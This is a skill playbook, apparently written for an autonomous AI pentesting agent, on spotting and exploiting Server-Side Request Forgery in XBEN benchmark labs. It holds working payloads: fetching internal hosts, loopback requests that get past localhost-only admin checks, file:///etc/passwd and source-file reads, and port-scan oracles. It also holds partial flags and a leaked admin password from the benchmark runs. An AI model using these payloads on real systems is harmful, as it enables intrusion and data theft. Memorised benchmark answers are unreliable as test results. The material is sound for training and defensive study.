# ssrf — when to use

Server-Side Request Forgery: the app takes a URL (or host/port) from your request and the
**server itself** makes an outbound fetch to it, then either shows you the fetched bytes or
changes behaviour based on the response. Dispatch this skill the moment recon shows an input
that the server will dereference for you — a `url=` parameter, a "fetch this for me" form, a
URL-rendering converter. The recurring lesson from the runs below: **the SSRF tell is almost
always a fetch-by-URL surface visible in recon (a `<input type="url">`, a `redirect.php?url=`,
a "Convert this URL" form), often paired with a localhost-only / internal resource the app
explicitly advertises. The skill should fire on the *fetch-by-URL shape* — do not wait for a
confirmed internal hit. In XBEN-024 the surface was present in recon and the planner routed it
to auth/disclosure instead of ssrf, so the SSRF lane never ran even though the box was SSRF.**

## Trigger signals (dispatch this skill the moment you observe…)

- **A request parameter that takes a whole URL and the server fetches it.** `redirect.php?url=…`,
  a form field `name="url"`, `name="profile_picture_url"`, a "Convert this URL" input. If the
  parameter value is itself a `http(s)://…` URL rather than an id or a path → ssrf applies.
- **A `<input type="url">` in a recon-fetched form.** XBEN-033 had `<input type="url" name="url">`
  ("Enter URL"); XBEN-024 had `<input type="url" name="profile_picture_url">` ("Or Profile Picture
  URL"). An HTML input whose *type is url* is a printed SSRF sink — the app is asking you for a URL
  it intends to dereference server-side.
- **The page text advertises an internal-only resource.** "Additional information is available
  internally for our employees at `http://internal-service`. The service is only accessible from our
  internal network." (XBEN-020) or "Admin interface … only accessible from localhost" (XBEN-033).
  Whenever recon surfaces an internal hostname / localhost-only endpoint *and* a fetch-by-URL input,
  the intended path is to make the server reach that resource for you → ssrf.
- **An admin/internal endpoint that returns `403 Forbidden` / `401 Unauthorized` to you directly,
  while a fetch-by-URL surface exists on the same host.** XBEN-033 `/admin` → `403 FORBIDDEN`;
  XBEN-024 `/reset_password` → `403 Unauthorized`. A 403 on the very thing you need, plus a way to
  make the server itself issue the request, is the canonical "use SSRF to bypass the origin check".
- **A "fetched content" wrapper in the response.** The reflected body is wrapped as
  `<h1>Fetched Content</h1><pre>…remote bytes…</pre>` (XBEN-020) — the server is echoing back what
  *it* downloaded, not what you typed. That wrapper confirms a server-side fetch.
- **A server-side fetch error string leaking the fetch library/sink.** `file_get_contents(http://…):
  failed to open stream: Connection refused in /var/www/html/redirect.php` (PHP, XBEN-020),
  `Error fetching the URL: <urlopen error [Errno 111] Connection refused>` (Python urllib, XBEN-033),
  `Failed to fetch image from URL.` (XBEN-024). Any of these means your URL reached an outbound
  fetch sink — vary the host/port and the error turns into a port-scan oracle.
- **The fetch honours non-`http` schemes.** `profile_picture_url=file:///etc/passwd` returning the
  passwd file (XBEN-024) proves the fetcher accepts `file://` (→ pivot to local file read) — a
  strong SSRF confirmation and an immediate disclosure primitive.
- **(inferred) A `Location:`/redirect parameter or a webhook/callback/image-proxy field.** Any
  param named `url`, `uri`, `link`, `src`, `dest`, `callback`, `webhook`, `feed`, `proxy`, `image`,
  `avatar`, `next`, `redirect` that the server resolves itself fits the same shape.

## Use-case scenarios

- **A dedicated URL-fetcher endpoint (the cleanest SSRF box).** XBEN-020 was exactly this:
  `index.php` advertised `http://internal-service` and exposed `redirect.php?url=`. The win was a
  single request — `redirect.php?url=http://internal-service` — and the internal page's body (with
  the flag) came straight back inside `<h1>Fetched Content</h1>`. When recon finds a thin app whose
  only real input is a `url=` parameter, ssrf is the primary lane, not a fallback.

- **A "render/convert this URL" feature.** XBEN-033 was a Markdown-to-HTML converter whose `/convert`
  form accepted *either* `markdown_text` *or* a `url` to fetch and render. The intended path: `/admin`
  is `403` to the outside, but the converter runs *on* the server, so
  `POST /convert url=http://127.0.0.7/admin/flag` makes the server fetch its own localhost-restricted
  admin page and render it back — flag included. Any converter/renderer/screenshotter/PDF-generator
  that takes a URL is this scenario.

- **SSRF used to bypass a localhost/origin restriction.** Both XBEN-033 (`/admin` localhost-only) and
  XBEN-024 (`/reset_password` returns `Unauthorized` from outside) are "restricted-to-localhost"
  designs. The SSRF input is the loopback you ride in on: point the server's fetcher at
  `http://127.0.0.1/<restricted>` / `http://localhost/<restricted>` and the request now originates
  from the host the check trusts. When you see a 403/401 on an admin or reset endpoint *and* a
  fetch-by-URL surface, this is the move.

- **A profile-picture / avatar "import from URL" upload.** XBEN-024's "Or Profile Picture URL"
  field was the SSRF sink hiding inside an upload feature. The app fetched the URL server-side and
  stored the result under `/static/uploads/`. That doubled as (a) an outbound fetch oracle and
  (b) a `file://` local-file-read primitive — `profile_picture_url=file:///etc/passwd` then
  `GET /static/uploads/passwd` returned the file, and `file:///app/app.py` leaked the source with
  the flag and the admin password. Import-from-URL upload fields are SSRF surfaces, not just upload
  surfaces — note the cross-over with `insecure-file-uploads` and `lfi`.

- **Reaching internal services found in recon.** When a port scan or recon shows internal listeners
  the outside cannot reach (XBEN-020's ports 49554/59869 spoke nothing over plain curl), the SSRF
  fetcher is the way to address `127.0.0.1:<port>` from inside — the `Connection refused` vs.
  a `200` difference becomes an internal port-scan oracle.

## Concrete tells (request → response examples)

- **Direct URL fetch returns remote bytes (XBEN-020).**
  Request: `GET /redirect.php?url=http://internal-service`
  Response: `200`, body `<h1>Fetched Content</h1><pre>… Internal Service … FLAG: FLAG{…}</pre>`.
  The "Fetched Content" wrapper + an internal hostname's HTML = confirmed SSRF read.

- **Connection-refused error leaks the sink and gives a port oracle (XBEN-020).**
  Request: `GET /redirect.php?url=http://127.0.0.5:49554/`
  Response: `Warning: file_get_contents(http://127.0.0.5:49554/): failed to open stream:
  Connection refused in /var/www/html/redirect.php on line 6`.
  A closed port refuses; an open one returns content — flip the port and you are scanning localhost.

- **SSRF to bypass a localhost-only admin (XBEN-033).**
  Baseline: `GET /admin` → `403 FORBIDDEN`. SSRF: `POST /convert` with `url=http://127.0.0.7/admin/flag`
  → `200`, body renders the Admin Interface and `<p>Your flag is: FLAG{…}</p>`. The same target,
  fetched by the server instead of by you, passes the origin check.

- **urllib fetch-error oracle (XBEN-033).**
  Request: `POST /convert url=http://127.0.0.1:4455/` → body `Error fetching the URL: <urlopen error
  [Errno 111] Connection refused>`. Closed/internal = that error; reachable = rendered content.

- **`file://` scheme → local file read (XBEN-024).**
  Request: `POST /profile profile_picture_url=file:///etc/passwd`, then `GET /static/uploads/passwd`
  → `200` with `root:x:0:0:…`. Repeating with `file:///app/app.py` returned the Flask source
  containing `FLAG = "flag{…}"` and `'admin': {'password': 'adminpass'}`.

- **Non-image fetch oracle on an upload field (XBEN-024).**
  Request: `POST /profile profile_picture_url=http://127.0.0.1:53183/reset_password?username=…`
  → body shows `<li>Failed to fetch image from URL.</li>` — the server *tried* the fetch
  (proving SSRF) but the response was not an image. That message confirms the sink even when the
  fetched content isn't reflected verbatim.

## When NOT to use it / easily-confused-with

- **A reflected/redirect parameter that the browser follows is not SSRF.** If `?next=/foo` or a
  `Location:` header just sends *your browser* somewhere (open redirect) without the *server*
  fetching anything, that is open-redirect, not ssrf. SSRF requires the server to make the request.
- **A `file=`/`page=`/`path=` parameter taking a filesystem path (not a URL) is LFI/path-traversal,
  not SSRF** — unless the fetcher accepts a `file://` *URL* scheme (then it is SSRF→LFI, as in
  XBEN-024). Distinguish by whether the input is a scheme-prefixed URL or a bare path.
- **A profile-picture file upload (multipart) without a URL field is `insecure-file-uploads`, not
  ssrf.** Only the *import-from-URL* variant (`profile_picture_url`) is the SSRF surface; the
  `<input type="file">` next to it is a different lane.
- **An internal/admin `403` with no fetch-by-URL input nearby is an auth/access-control problem
  (auth-testing / bfla), not ssrf.** SSRF is only the answer when you also have a server-side
  fetcher to route the request through. In XBEN-024 the box *was* SSRF, but because the winning
  agents focused on the auth/disclosure framing first, recognise that "403 admin + reset endpoint"
  alone can mis-route to auth; the deciding factor is the presence of the `url=`/`profile_picture_url`
  fetcher.
- **A value the server *evaluates* rather than *fetches* is a different class.** `{{7*7}}→49` is SSTI;
  a quote causing a `500` is SQLi. SSRF is specifically "the server makes an HTTP/file request to a
  location I control." (XBEN-033's `REMOTE_MARKER {{7*7}}` text only appeared because an oracle host
  *served* it as static bytes — it was never evaluated, so that was still SSRF, not SSTI.)

## Evidence

- **Fetch-by-URL parameter that returns remote bytes (primary trigger).** XBEN-020 (PASS,
  `vulntype-ssrf`). `index.php` advertised `http://internal-service` and a `<form>`; the win was
  `GET /redirect.php?url=http://internal-service` returning
  `<h1>Fetched Content</h1><pre>… FLAG: FLAG{6e5d772f…}</pre>`. Observed:
  `logs/full_run_06-06_01h05m/run-06-06_01h13m08s_XBEN-020/full_logs.jsonl`, `bash_output` at
  `2026-06-06T01:19:15.197` (agent `vulntype-ssrf`); `flag_auto_verified matched:true` at
  `01:19:15.339`.
- **PHP `file_get_contents` connection-refused error = sink + port oracle.** XBEN-020. Body
  `Warning: file_get_contents(http://127.0.0.5:49554/): failed to open stream: Connection refused in
  /var/www/html/redirect.php on line 6`. Same log, `bash_output` at `2026-06-06T01:19:34.113`.
- **Internal hostname / localhost-only resource advertised in recon.** XBEN-020 homepage text:
  "Additional information is available internally for our employees at `http://internal-service` …
  only accessible from our internal network." Same log, `bash_output` at `2026-06-06T01:19:15.197`.
  benchmark.json hint: "Can you find a way to access the internal services? … Check the exposed web
  server index."
- **`<input type="url">` "Convert this URL" form + localhost-only `/admin` 403.** XBEN-033 (PASS,
  `vulntype-ssrf`). Recon: `gobuster` → `admin (Status: 403)`; `/convert` form has
  `<input type="url" name="url">`. Observed:
  `logs/full_run_06-06_01h05m/run-06-06_01h54m47s_XBEN-033/full_logs.jsonl`, `bash_output` events at
  `2026-06-06T01:55:39.962` (gobuster) and `01:56:23.524` (convert form).
- **SSRF bypasses the localhost-only admin restriction → flag.** XBEN-033. `POST /convert
  url=http://127.0.0.7/admin/flag` returned the Admin Interface and `Your flag is:
  FLAG{9a23b344…}`. Same log; `flag_auto_verified matched:true` at `2026-06-06T02:01:19.805`
  (agent `vulntype-ssrf`).
- **Python `urlopen` fetch-error oracle.** XBEN-033. `POST /convert url=http://127.0.0.1:4455/` →
  `Error fetching the URL: <urlopen error [Errno 111] Connection refused>`. Same log, `bash_output`
  at `2026-06-06T02:00:46.843` and the convert outputs around `01:56`–`02:01`.
- **"Or Profile Picture URL" import field as SSRF sink — observed but mis-routed (key failure
  lesson).** XBEN-024 (tagged `ssrf`). benchmark.json: "Profile Picture … login as the admin … find
  the interesting endpoint." Recon surfaced `<input type="url" name="profile_picture_url">` and a
  localhost-only `/reset_password` → `403 Unauthorized`. The 06-06 run never tested it: it crashed
  in the planner with 50× `CodexAPIError 429 usage_limit_reached` (an infrastructure failure, not a
  missed signal) —
  `logs/full_run_06-06_01h05m/run-06-06_02h12m02s_XBEN-024/full_logs.jsonl`, `llm_error` at
  `2026-06-06T02:12:14.981` through `02:12:58`. In the earlier complete run
  (`logs/1_full_run/run-05-31_23h49m09s_XBEN-024/full_logs.jsonl`) the box was solved, but the
  planner dispatched `owasp-auth` and `vulntype-information-disclosure` — **`vulntype-ssrf` was never
  dispatched** despite the SSRF surface being visible in recon. Recon form observed at
  `2026-05-31T23:50:04.298`.
- **`file://` scheme via the import-from-URL field → local file read → source/flag disclosure.**
  XBEN-024 (earlier run). `profile_picture_url=file:///etc/passwd` then `GET /static/uploads/passwd`
  returned `root:x:0:0:…` (`bash_output` at `2026-05-31T23:51:59.726` and `23:52:05.218`);
  `file:///app/app.py` leaked the Flask source containing `FLAG = "flag{335dd283…}"` and admin
  creds `adminpass` (`bash_output` at `2026-05-31T23:52:16.192`, agent
  `vulntype-information-disclosure`); `flag_auto_verified matched:true` at `23:52:16.204`.
- **Non-image fetch oracle (`Failed to fetch image from URL`).** XBEN-024. `owasp-auth` aimed the
  fetcher at `http://127.0.0.1:53183/reset_password?…` to ride loopback into the localhost-only
  reset; body returned `<li>Failed to fetch image from URL.</li>` — confirming the server attempted
  the fetch. `bash_output` at `2026-05-31T23:52:11.621` and `23:52:26.663`.
